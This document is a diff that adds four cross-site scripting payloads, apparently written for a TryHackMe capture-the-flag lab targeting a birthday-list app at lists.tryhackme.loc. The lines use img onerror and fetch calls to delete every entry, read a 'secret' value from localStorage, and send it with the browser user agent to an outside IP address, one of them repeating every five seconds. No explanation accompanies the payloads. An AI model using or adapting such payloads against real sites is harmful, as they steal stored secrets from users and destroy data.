@@ -1,0 +1,4 @@
+console.log('test');fetch('http://lists.tryhackme.loc:5001/bdays').then(r => r.json()).then(data => { data.bdays.forEach(x => removeBday(x.id)); });
+<img src="x" onerror="fetch('http://lists.tryhackme.loc:5001/bdays').then(r => r.json()).then(data => { data.bdays.forEach(x => {var secret = localStorage.getItem('secret');fetch('http://lists.tryhackme.loc:5001/bdays/'+x.id+'?secret='+secret,{method:'DELETE'});});});"/>
+<img src="x" onerror="fetch('http://lists.tryhackme.loc:5001/bdays').then(r => r.json()).then(data => { data.bdays.forEach(x => {const secret = localStorage.getItem('secret');fetch('http://192.168.129.233:8888/?secret='+encodeURIComponent(secret)+'&ua='+encodeURIComponent(navigator.userAgent));});});"/>
+<img src="x" onerror="setInterval(()=>{const secret=localStorage.getItem('secret');fetch('http://192.168.129.233:8888/?secret='+encodeURIComponent(secret)+'&ua='+encodeURIComponent(navigator.userAgent)+'&t='+Date.now())},5000)">
